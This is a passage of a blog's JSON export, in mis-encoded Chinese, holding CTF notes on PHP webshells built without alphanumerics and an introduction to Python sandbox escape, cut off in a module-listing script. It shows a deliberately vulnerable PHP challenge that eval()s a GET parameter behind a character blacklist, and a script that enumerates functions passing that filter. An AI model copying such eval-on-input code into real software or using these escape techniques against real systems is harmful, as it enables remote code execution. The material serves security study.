é—­åˆphpæ–‡ä»¶å¼€å¤´çš„ <code>&lt;?php</code> , <code>&lt;?</code> ç›¸å½“äº <code>&lt;? echo</code> .</p>\n<p>åœ¨é…ç½®æ–‡ä»¶ä¸­å¼€å¯ <code>short_open_tag</code> åå¯ä»¥ä½¿ç”¨çŸ­æ ‡ç­¾ã€‚é»˜è®¤æ˜¯å¼€å¯çš„ã€‚</p>\n<h2 id=\"another-test\"><a href=\"#another-test\" class=\"headerlink\" title=\"another test\"></a>another test</h2><pre><code>&lt;?php\nhighlight_file(__FILE__);\n\n$_ = @$_GET[&apos;_&apos;];\nif ( preg_match(&apos;/[\\x00- 0-9\\&apos;&quot;`$&amp;.,|[{_defgops\\x7F]+/i&apos;, $_) )\n    die(&apos;rosÃ© will not do it&apos;);\n\nif ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )\n    die(&apos;you are so close, omg&apos;);\n\neval($_);\n?&gt;</code></pre><p>ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹å¤§ä½¬çš„æ£€æµ‹å¯ç”¨å‡½æ•°çš„è„šæœ¬ï¼š</p>\n<pre><code>&lt;?php \n$arr = get_defined_functions()[&apos;internal&apos;];\n\nforeach ($arr as $key =&gt; $value) {\n    if ( preg_match(&apos;/[\\x00- 0-9\\&apos;&quot;`$&amp;.,|[{_defgops\\x7F]+/i&apos;, $value) ){\n        unset($arr[$key]);\n        continue;\n    }\n\n    if ( strlen(count_chars(strtolower($value), 0x3)) &gt; 0xd ){\n        unset($arr[$key]);\n        continue;\n    }\n}\n\nvar_dump($arr);\n?&gt;</code></pre><h2 id=\"å‚è€ƒé“¾æ¥\"><a href=\"#å‚è€ƒé“¾æ¥\" class=\"headerlink\" title=\"å‚è€ƒé“¾æ¥\"></a>å‚è€ƒé“¾æ¥</h2><blockquote>\n<p><a href=\"https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a></p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\" target=\"_blank\" rel=\"noopener\">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>\n<p><a href=\"https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/\" target=\"_blank\" rel=\"noopener\">https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/</a></p>\n<p><a href=\"https://xz.aliyun.com/t/5677#toc-3\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/5677#toc-3</a></p>\n</blockquote>\n","text":"ç‰¹æ®Šçš„webshellå®éªŒç¯å¢ƒ ï¼šphp 5.45+nts+apachephp5ä¸­assertæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡$f=&#39;assert&#39;;$f(...);è¿™æ ·çš„æ–¹æ³•æ¥åŠ¨æ€æ‰§è¡Œä»»æ„ä»£ç ã€‚ä½† php7ä¸­ï¼Œassertä¸å†æ˜¯å‡½æ•°ï¼Œå˜æˆäº†ä¸€ä¸ªè¯­è¨€ç»“æ„ï¼ˆç±»ä¼¼evalï¼‰ï¼Œ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]},{"title":"pythonæ²™ç›’é€ƒé€¸:ä»å¤´å¼€å§‹","slug":"pythonæ²™ç®±é€ƒé€¸","date":"2019-10-11T06:26:44.000Z","updated":"2019-10-14T12:20:33.712Z","comments":true,"path":"api/articles/pythonæ²™ç®±é€ƒé€¸.json","excerpt":"","keywords":null,"cover":"https://pic2.zhimg.com/80/dcfa446418490a973b8dd47e83c181a8_hd.jpg","content":"<p>10/11/2019 2:26:44 PM </p>\n<h1 id=\"Python-æ²™ç®±é€ƒé€¸ä½ çœŸçš„çœ‹æ‡‚äº†ä¹ˆï¼Ÿ\"><a href=\"#Python-æ²™ç®±é€ƒé€¸ä½ çœŸçš„çœ‹æ‡‚äº†ä¹ˆï¼Ÿ\" class=\"headerlink\" title=\"Python æ²™ç®±é€ƒé€¸ä½ çœŸçš„çœ‹æ‡‚äº†ä¹ˆï¼Ÿ\"></a>Python æ²™ç®±é€ƒé€¸ä½ çœŸçš„çœ‹æ‡‚äº†ä¹ˆï¼Ÿ</h1><p>python æ²™ç®±é€ƒé€¸å°±æ˜¯åœ¨ä¸€ä¸ªè¢«ä¸¥æ ¼é™åˆ¶äº† python æ‰§è¡Œç¯å¢ƒä¸­è·å–æ›´é«˜çš„æƒé™ï¼Œç”šè‡³ getshell ,è¿™æ˜¯æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„ã€‚ä½†æ˜¯åœ¨è¿™ä¹‹å‰æˆ‘ä»¬éœ€è¦ç»•è¿‡å„ç§é™åˆ¶ã€‚</p>\n<p>ç”±äºç¯å¢ƒä¸­é™åˆ¶äº†è®¸å¤šæ•æ„Ÿæ¨¡å—æ¯”å¦‚ os ã€ sys ï¼Œäºæ˜¯æˆ‘ä»¬çš„é‡ç‚¹å˜æˆäº†å¦‚ä½•ç»•è¿‡é™åˆ¶å»å¼•å…¥èƒ½æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„æ“ä½œçš„æ¨¡å—ã€‚</p>\n<p>æ¥ä¸‹æ¥è®©æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹ python çš„ä¸¤ä¸ªéå¸¸é‡è¦çš„ä¸œè¥¿</p>\n<h2 id=\"type-amp-object\"><a href=\"#type-amp-object\" class=\"headerlink\" title=\"type &amp; object\"></a>type &amp; object</h2><p>åœ¨ python é‡Œè¦æŸ¥çœ‹ä¸€ä¸ªç±»å‹çš„çˆ¶ç±»ï¼Œä½¿ç”¨å®ƒçš„ <strong>base</strong> å±æ€§æŸ¥çœ‹ã€‚  åœ¨ python é‡ŒæŸ¥çœ‹ä¸€ä¸ªå®ä¾‹çš„ç±»å‹ï¼Œä½¿ç”¨å®ƒçš„ <strong>class</strong> å±æ€§å¯ä»¥æŸ¥çœ‹ï¼Œæˆ–è€…ä½¿ç”¨ type() å‡½æ•°æŸ¥çœ‹ã€‚</p>\n<pre><code>&gt;&gt;&gt; object\n&lt;type &apos;object&apos;&gt;\n&gt;&gt;&gt; type\n&lt;type &apos;type&apos;&gt;</code></pre><p>ä»–ä»¬éƒ½æ˜¯ type çš„ä¸€ä¸ªå®ä¾‹ï¼Œè¡¨ç¤ºä»–ä»¬éƒ½æ˜¯ç±»å‹å¯¹è±¡ã€‚</p>\n<p>Python ä¸­ï¼Œ object æ˜¯çˆ¶å­å…³ç³»çš„é¡¶ç«¯ï¼Œæ‰€æœ‰æ•°æ®ç±»å‹çš„çˆ¶ç±»éƒ½æ˜¯å®ƒï¼› type æ˜¯ç±»å‹å®ä¾‹å…³ç³»çš„é¡¶ç«¯ï¼Œæ‰€æœ‰å¯¹è±¡éƒ½æ˜¯å®ƒçš„å®ä¾‹ï¼Œä»–ä»¬çš„å…³ç³»å¯ä»¥æè¿°ä¸º: object æ˜¯ä¸€ä¸ª type (object is a instance of type)ï¼Œå³ Object æ˜¯ type çš„ä¸€ä¸ªå®ä¾‹ã€‚</p>\n<pre><code>&gt;&gt;&gt; object.__class__\n&lt;type &apos;type&apos;&gt;\n\n&gt;&gt;&gt; object.__bases__  #ç«™åœ¨é£Ÿç‰©é“¾é¡¶ç«¯çš„ç”·äººï¼Œæ²¡æœ‰çˆ¶ç±»\n()\n\n&gt;&gt;&gt; type.__bases__\n(&lt;type &apos;object&apos;&gt;,)\n&gt;&gt;&gt; type.__class__    #type çš„ç±»å‹æ˜¯è‡ªå·±\n&lt;type &apos;type&apos;&gt;</code></pre><p>æˆ‘ä»¬å†å°è¯•å¼•å…¥ä¸€äº›å†…ç½®æ•°æ®ç±»å‹æ¥çœ‹çœ‹ï¼š</p>\n<pre><code>&gt;&gt;&gt; list.__bases__\n(&lt;type &apos;object&apos;&gt;,)\n&gt;&gt;&gt; type.__class__\n&lt;type &apos;type&apos;&gt;\n&gt;&gt;&gt; dict.__bases__\n(&lt;type &apos;object&apos;&gt;,)\n&gt;&gt;&gt; dict.__class__\n&lt;type &apos;type&apos;&gt;</code></pre><p><strong>ä»–ä»¬çš„çˆ¶ç±»éƒ½æ˜¯ object , ç±»å‹éƒ½æ˜¯ type</strong>ï¼Œè¿™ç‚¹å¾ˆé‡è¦ï¼</p>\n<p>æˆ‘ä»¬æŠŠä»–ä»¬æ”¾åœ¨ä¸€ä¸ªè¡¨é‡Œçœ‹çœ‹ï¼š</p>\n<p><img src=\"https://pic2.zhimg.com/80/dcfa446418490a973b8dd47e83c181a8_hd.jpg\" alt></p>\n<p>ç™½æ¿ä¸Šçš„è™šçº¿è¡¨ç¤ºæºæ˜¯ç›®æ ‡çš„å®ä¾‹ï¼Œå®çº¿è¡¨ç¤ºæºæ˜¯ç›®æ ‡çš„å­ç±»ã€‚å³ï¼Œå·¦è¾¹çš„æ˜¯å³è¾¹çš„ç±»å‹ï¼Œè€Œä¸Šé¢çš„æ˜¯ä¸‹é¢çš„çˆ¶äº²ã€‚</p>\n<h2 id=\"builtinã€builtinsã€builtins-æ˜¯ä»€ä¹ˆï¼Ÿ\"><a href=\"#builtinã€builtinsã€builtins-æ˜¯ä»€ä¹ˆï¼Ÿ\" class=\"headerlink\" title=\"builtinã€builtinsã€builtins æ˜¯ä»€ä¹ˆï¼Ÿ\"></a><strong>builtin</strong>ã€<strong>builtins</strong>ã€builtins æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>python ä¸­æœ‰ä¸€ä¸ªå†…å»ºæ¨¡å—ï¼Œè¯¥æ¨¡å—ä¸­æœ‰ä¸€äº›å¸¸ç”¨å‡½æ•°ï¼›è€Œè¯¥æ¨¡å—åœ¨ Python å¯åŠ¨ä¹‹åã€ä¸”æ²¡æœ‰æ‰§è¡Œä»»ä½•ä»£ç ä¹‹å‰ï¼Œpython ä¼šé¦–å…ˆåŠ è½½è¯¥å†…å»ºå‡½æ•°åˆ°å†…å­˜ä¸­ã€‚å¦å¤–ï¼Œè¯¥å†…å»ºå‡½æ•°ä¸­çš„åŠŸèƒ½å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸éœ€è¦æ·»åŠ ä»»ä½•å†…å»ºæ¨¡å—å‰ç¼€ï¼Œå…¶åŸå› æ˜¯å¯¹å‡½æ•°ã€å˜é‡ã€ç±»ç­‰æ ‡è¯†ç¬¦çš„æŸ¥æ‰¾æ˜¯æŒ‰ç…§ LE(N)GB çš„è§„åˆ™</p>\n<pre><code>locals -&gt; enclosing function -&gt; globals -&gt; builtins</code></pre><p>åœ¨ Python2.x ç‰ˆæœ¬ä¸­ï¼Œå†…å»ºæ¨¡å—è¢«å‘½ä¸º <code>__builtin__</code> , è€Œåˆ°äº† Python3.x ç‰ˆæœ¬æ›´åä¸º <code>builtins</code> .</p>\n<p>å½“ä½¿ç”¨å†…å»ºæ¨¡å—ä¸­å‡½æ•°æˆ–å…¶å®ƒåŠŸèƒ½æ—¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¸ç”¨æ·»åŠ å†…å»ºæ¨¡å—çš„åå­—;ä½†æ˜¯ï¼Œå¦‚æœæƒ³è¦å‘å†…å»ºæ¨¡å—ä¸­æ·»åŠ ä¸€äº›åŠŸèƒ½ï¼Œä»¥ä¾¿åœ¨ä»»ä½•å‡½æ•°ä¸­éƒ½èƒ½ç›´æ¥ä½¿ç”¨è€Œä¸ ç”¨å†è¿›è¡Œimportï¼Œè¿™æ—¶ï¼Œå°±è¦å¯¼å…¥å†…å»ºæ¨¡å—ï¼Œåœ¨å†…å»ºæ¨¡å—çš„å‘½åç©ºé—´(å³ <strong>dict</strong> å­—å…¸å±æ€§)ä¸­æ·»åŠ è¯¥åŠŸèƒ½ã€‚åœ¨å¯¼å…¥æ—¶ï¼Œå¦‚æœæ˜¯ Python2.X ç‰ˆæœ¬ï¼Œå°±è¦å¯¼å…¥ <code>__builtin__</code> æ¨¡å—;å¦‚æœæ˜¯ Python3.Xç‰ˆæœ¬ï¼Œå°±è¦å¯¼å…¥builtins æ¨¡å—ã€‚å¦‚ï¼šåœ¨ Python2.X ä¸­ï¼Œå‘å†…å»ºæ¨¡å—æ·»åŠ  ä¸€ä¸ªå‡½æ•°(è¯¥å‡½æ•°æ‰“å° â€œhello, worldâ€ )ï¼Œå¯ä»¥è¿™æ ·å†™</p>\n<pre><code>&gt;&gt;&gt; import __builtin__\n&gt;&gt;&gt; def print_hello():\n...     print &quot;hello world!&quot;\n...\n&gt;&gt;&gt; __builtin__.__dict__[&apos;hello&apos;]=print_hello\n&gt;&gt;&gt; print_hello()\nhello world!\n&gt;&gt;&gt; hello()\nhello world!</code></pre><p>æ­¤æ—¶ï¼Œ <code>print_hello</code> å’Œ <code>hello</code> ä¸¤ä¸ªå‡½æ•°åå‡ ä¹æ˜¯ä¸€æ ·ï¼Œä½†æ˜¯æœ‰ä¸€ç‚¹åŒºåˆ«ï¼Œ<code>print_hello</code>åªèƒ½åœ¨è¯¥æ¨¡å—ä¸­ä½¿ç”¨ï¼Œè€Œ <code>hello</code> å¯ä»¥åœ¨æœ¬ç¨‹åºä¸­çš„å…¶å®ƒä»»ä½•ä¸€ä¸ªæ¨¡å—ä¸­ä½¿ç”¨ï¼Œå› ä¸º <code>hello</code> å·²ç»æ”¾åˆ°å†…å»ºæ¨¡å—ä¸­äº†ã€‚</p>\n<p>è¯´å®Œäº† <code>__builtin__</code> å’Œ <code>builtin</code> ,é‚£ <code>__builtins__</code> æ˜¯ä»€ä¹ˆï¼Ÿ</p>\n<p><code>__builtins__</code> å³æ˜¯å¼•ç”¨ï¼Œä¹Ÿæ˜¯åœ¨ä»£ç è¿è¡Œä¹‹å‰è¢«åŠ è½½åˆ°å†…å­˜ä¸­ã€‚ä½†æ˜¯å®ƒä»¬è¿˜æœ‰ä¸€ç‚¹åŒºåˆ«ï¼š</p>\n<ol>\n<li>æ— è®ºä»»ä½•åœ°æ–¹è¦æƒ³ä½¿ç”¨å†…å»ºæ¨¡å—ï¼Œéƒ½å¿…é¡»åœ¨è¯¥ä½ç½®æ‰€å¤„çš„ä½œç”¨åŸŸä¸­å¯¼å…¥ <code>__builtin__</code> å†…å»ºæ¨¡å—;è€Œå¯¹äº <code>__builtins__</code> å´ä¸ç”¨å¯¼å…¥ï¼Œå®ƒåœ¨ä»»ä½•æ¨¡å—éƒ½ç›´æ¥å¯è§</li>\n<li>åœ¨ä¸»æ¨¡å— <code>__main__</code> ä¸­ <code>__builtins__</code> æ˜¯å¯¹å†…å»ºæ¨¡å— <code>__builtin__</code> æœ¬èº«çš„å¼•ç”¨ï¼Œå³ <code>__builtins__</code> å®Œå…¨ç­‰ä»·äº <code>__builtin__</code> ï¼ŒäºŒè€…å®Œå…¨æ˜¯ä¸€ä¸ªä¸œè¥¿ï¼Œä¸åˆ†å½¼æ­¤ï¼›åœ¨éä¸»æ¨¡å—ä¸­ <code>__builtins__</code> ä»…æ˜¯å¯¹ <code>__builtin__</code> . <code>__dict__</code> çš„å¼•ç”¨ï¼Œè€Œé<code>__builtin__</code> æœ¬èº«ã€‚å®ƒåœ¨ä»»ä½•åœ°æ–¹éƒ½å¯è§ã€‚æ­¤æ—¶ <code>__builtins__</code> çš„ç±»å‹æ˜¯å­—å…¸ã€‚</li>\n</ol>\n<p>æˆ‘ä»¬æ‰“å¼€ IDLE çœ‹çœ‹è¿™é‡Œé¢éƒ½æœ‰ä»€ä¹ˆä¸œè¥¿å§(Python 2.7)ã€‚</p>\n<pre><code>&gt;&gt;&gt; dir(__builtins__)\n[&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;WindowsError&apos;, &apos;ZeroDivisionError&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;]</code></pre><p>æˆ‘ä»¬çœ‹åˆ°äº†å¸¸ç”¨çš„ <code>__import__</code> ã€ <code>bin</code> ã€ <code>eval</code> ç­‰å‘½ä»¤</p>\n<p>å¥½äº†ï¼Œç°åœ¨æˆ‘ä»¬å·²ç»å¤§è‡´ä¸ŠçŸ¥é“äº†å„ä¸ªæ¨¡å—ä¹‹é—´çš„å…³ç³»äº†ï¼</p>\n<h2 id=\"Python-æœ‰å“ªäº›å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‘¢ï¼Ÿ\"><a href=\"#Python-æœ‰å“ªäº›å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‘¢ï¼Ÿ\" class=\"headerlink\" title=\"Python æœ‰å“ªäº›å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‘¢ï¼Ÿ\"></a>Python æœ‰å“ªäº›å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‘¢ï¼Ÿ</h2><p>os  commands  subprocess  timeit  platform  pty â€¦</p>\n<p>æ¬è¿ä¸€ä¸ªæµ‹è¯•æ‰€æœ‰å¯¼å…¥ os æˆ–è€… sys çš„åº“çš„è„šæœ¬ï¼š</p>\n<pre><code>#-*- coding:utf8 -*-\n# By Macr0phag3\n# in 2019-05-07 19:46:12\n# ------------------------------------\n\n# this, antigravity åº“åˆ æ‰\nall_modules_2 = [\n    &apos;BaseHTTPServer&apos;, &apos;imaplib&apos;, &apos;shelve&apos;, &apos;Bastion&apos;, &apos;anydbm&apos;, &apos;imghdr&apos;, &apos;shlex&apos;, &apos;CDROM&apos;, &apos;argparse&apos;, &apos;imp&apos;, &apos;shutil&apos;, &apos;CGIHTTPServer&apos;, &apos;array&apos;, &apos;importlib&apos;, &apos;signal&apos;, &apos;Canvas&apos;, &apos;ast&apos;, &apos;imputil&apos;, &apos;site&apos;, &apos;ConfigParser&apos;, &apos;asynchat&apos;, &apos;inspect&apos;, &apos;sitecustomize&apos;, &apos;Cookie&apos;, &apos;asyncore&apos;, &apos;io&apos;, &apos;smtpd&apos;, &apos;DLFCN&apos;, &apos;atexit&apos;, &apos;itertools&apos;, &apos;smtplib&apos;, &apos;Dialog&apos;, &apos;audiodev&apos;, &apos;json&apos;, &apos;sndhdr&apos;, &apos;DocXMLRPCServer&apos;, &apos;audioop&apos;, &apos;keyword&apos;, &apos;socket&apos;, &apos;FileDialog&apos;, &apos;base64&apos;, &apos;lib2to3&apos;, &apos;spwd&apos;, &apos;FixTk&apos;, &apos;bdb&apos;, &apos;linecache&apos;, &apos;sqlite3&apos;, &apos;HTMLParser&apos;, &apos;binascii&apos;, &apos;linuxaudiodev&apos;, &apos;sre&apos;, &apos;IN&apos;, &apos;binhex&apos;, &apos;locale&apos;, &apos;sre_compile&apos;, &apos;MimeWriter&apos;, &apos;bisect&apos;, &apos;logging&apos;, &apos;sre_constants&apos;, &apos;Queue&apos;, &apos;bsddb&apos;, &apos;lsb_release&apos;, &apos;sre_parse&apos;, &apos;ScrolledText&apos;, &apos;bz2&apos;, &apos;macpath&apos;, &apos;ssl&apos;, &apos;SimpleDialog&apos;, &apos;cPickle&apos;, &apos;macurl2path&apos;, &apos;stat&apos;, &apos;SimpleHTTPServer&apos;, &apos;cProfile&apos;, &apos;mailbox&apos;, &apos;statvfs&apos;, &apos;SimpleXMLRPCServer&apos;, &apos;cStringIO&apos;, &apos;mailcap&apos;, &apos;string&apos;, &apos;SocketServer&apos;, &apos;calendar&apos;, &apos;markupbase&apos;, &apos;stringold&apos;, &apos;StringIO&apos;, &apos;cgi&apos;, &apos;marshal&apos;, &apos;stringprep&apos;, &apos;TYPES&apos;, &apos;cgitb&apos;, &apos;math&apos;, &apos;strop&apos;, &apos;Tix&apos;, &apos;chunk&apos;, &apos;md5&apos;, &apos;struct&apos;, &apos;Tkconstants&apos;, &apos;cmath&apos;, &apos;mhlib&apos;, &apos;subprocess&apos;, &apos;Tkdnd&apos;, &apos;cmd&apos;, &apos;mimetools&apos;, &apos;sunau&apos;, &apos;Tkinter&apos;, &apos;code&apos;, &apos;mimetypes&apos;, &apos;sunaudio&apos;, &apos;UserDict&apos;, &apos;codecs&apos;, &apos;mimify&apos;, &apos;symbol&apos;, &apos;UserList&apos;, &apos;codeop&apos;, &apos;mmap&apos;, &apos;symtable&apos;, &apos;UserString&apos;, &apos;collections&apos;, &apos;modulefinder&apos;, &apos;sys&apos;, &apos;_LWPCookieJar&apos;, &apos;colorsys&apos;, &apos;multifile&apos;, &apos;sysconfig&apos;, &apos;_MozillaCookieJar&apos;, &apos;commands&apos;, &apos;multiprocessing&apos;, &apos;syslog&apos;, &apos;__builtin__&apos;, &apos;compileall&apos;, &apos;mutex&apos;, &apos;tabnanny&apos;, &apos;__future__&apos;, &apos;compiler&apos;, &apos;netrc&apos;, &apos;talloc&apos;, &apos;_abcoll&apos;, &apos;contextlib&apos;, &apos;new&apos;, &apos;tarfile&apos;, &apos;_ast&apos;, &apos;cookielib&apos;, &apos;nis&apos;, &apos;telnetlib&apos;, &apos;_bisect&apos;, &apos;copy&apos;, &apos;nntplib&apos;, &apos;tempfile&apos;, &apos;_bsddb&apos;, &apos;copy_reg&apos;, &apos;ntpath&apos;, &apos;termios&apos;, &apos;_codecs&apos;, &apos;crypt&apos;, &apos;nturl2path&apos;, &apos;test&apos;, &apos;_codecs_cn&apos;, &apos;csv&apos;, &apos;numbers&apos;, &apos;textwrap&apos;, &apos;_codecs_hk&apos;, &apos;ctypes&apos;, &apos;opcode&apos;, &apos;_codecs_iso2022&apos;, &apos;curses&apos;, &apos;operator&apos;, &apos;thread&apos;, &apos;_codecs_jp&apos;, &apos;datetime&apos;, &apos;optparse&apos;, &apos;threading&apos;, &apos;_codecs_kr&apos;, &apos;dbhash&apos;, &apos;os&apos;, &apos;time&apos;, &apos;_codecs_tw&apos;, &apos;dbm&apos;, &apos;os2emxpath&apos;, &apos;timeit&apos;, &apos;_collections&apos;, &apos;decimal&apos;, &apos;ossaudiodev&apos;, &apos;tkColorChooser&apos;, &apos;_csv&apos;, &apos;difflib&apos;, &apos;parser&apos;, &apos;tkCommonDialog&apos;, &apos;_ctypes&apos;, &apos;dircache&apos;, &apos;pdb&apos;, &apos;tkFileDialog&apos;, &apos;_ctypes_test&apos;, &apos;dis&apos;, &apos;pickle&apos;, &apos;tkFont&apos;, &apos;_curses&apos;, &apos;distutils&apos;, &apos;pickletools&apos;, &apos;tkMessageBox&apos;, &apos;_curses_panel&apos;, &apos;doctest&apos;, &apos;pipes&apos;, &apos;tkSimpleDialog&apos;, &apos;_elementtree&apos;, &apos;dumbdbm&apos;, &apos;pkgutil&apos;, &apos;toaiff&apos;, &apos;_functools&apos;, &apos;dummy_thread&apos;, &apos;platform&apos;, &apos;token&apos;, &apos;_hashlib&apos;, &apos;dummy_threading&apos;, &apos;plistlib&apos;, &apos;tokenize&apos;, &apos;_heapq&apos;, &apos;email&apos;, &apos;popen2&apos;, &apos;trace&apos;, &apos;_hotshot&apos;, &apos;encodings&apos;, &apos;poplib&apos;, &apos;traceback&apos;, &apos;_io&apos;, &apos;ensurepip&apos;, &apos;posix&apos;, &apos;ttk&apos;, &apos;_json&apos;, &apos;errno&apos;, &apos;posixfile&apos;, &apos;tty&apos;, &apos;_locale&apos;, &apos;exceptions&apos;, &apos;posixpath&apos;, &apos;turtle&apos;, &apos;_lsprof&apos;, &apos;fcntl&apos;, &apos;pprint&apos;, &apos;types&apos;, &apos;_md5&apos;, &apos;filecmp&apos;, &apos;profile&apos;, &apos;unicodedata&apos;, &apos;_multibytecodec&apos;, &apos;fileinput&apos;, &apos;pstats&apos;, &apos;unittest&apos;, &apos;_multiprocessing&apos;, &apos;fnmatch&apos;, &apos;pty&apos;, &apos;urllib&apos;, &apos;_osx_support&apos;, &apos;formatter&apos;, &apos;pwd&apos;, &apos;urllib2&apos;, &apos;_pyio&apos;, &apos;fpformat&apos;, &apos;py_compile&apos;, &apos;urlparse&apos;, &apos;_random&apos;, &apos;fractions&apos;, &apos;pyclbr&apos;, &apos;user&apos;, &apos;_sha&apos;, &apos;ftplib&apos;, &apos;pydoc&apos;, &apos;uu&apos;, &apos;_sha256&apos;, &apos;functools&apos;, &apos;pydoc_data&apos;, &apos;uuid&apos;, &apos;_sha512&apos;, &apos;future_builtins&apos;, &apos;pyexpat&apos;, &apos;warnings&apos;, &apos;_socket&apos;, &apos;gc&apos;, &apos;quopri&apos;, &apos;wave&apos;, &apos;_sqlite3&apos;, &apos;genericpath&apos;, &apos;random&apos;, &apos;weakref&apos;, &apos;_sre&apos;, &apos;getopt&apos;, &apos;re&apos;, &apos;webbrowser&apos;, &apos;_ssl&apos;, &apos;getpass&apos;, &apos;readline&apos;, &apos;whichdb&apos;, &apos;_strptime&apos;, &apos;gettext&apos;, &apos;repr&apos;, &apos;wsgiref&apos;, &apos;_struct&apos;, &apos;glob&apos;, &apos;resource&apos;, &apos;xdrlib&apos;, &apos;_symtable&apos;, &apos;grp&apos;, &apos;rexec&apos;, &apos;xml&apos;, &apos;_sysconfigdata&apos;, &apos;gzip&apos;, &apos;rfc822&apos;, &apos;xmllib&apos;, &apos;_sysconfigdata_nd&apos;, &apos;hashlib&apos;, &apos;rlcompleter&apos;, &apos;xmlrpclib&apos;, &apos;_testcapi&apos;, &apos;heapq&apos;, &apos;robotparser&apos;, &apos;xxsubtype&apos;, &apos;_threading_local&apos;, &apos;hmac&apos;, &apos;runpy&apos;, &apos;zipfile&apos;, &apos;_warnings&apos;, &apos;hotshot&apos;, &apos;sched&apos;, &apos;zipimport&apos;, &apos;_weakref&apos;, &apos;htmlentitydefs&apos;, &apos;select&apos;, &apos;zlib&apos;, &apos;_weakrefset&apos;, &apos;htmllib&apos;, &apos;sets&apos;, &apos;abc&apos;, &apos;httplib&apos;, &apos;sgmllib&apos;, &apos;aifc&apos;, &apos;ihooks&apos;, &apos;sha&apos;\n]\n\nall_modules_3 = [\n    &apos;AptUrl&apos;, &apos;hmac&apos;, &apos;requests_unixsocket&apos;, 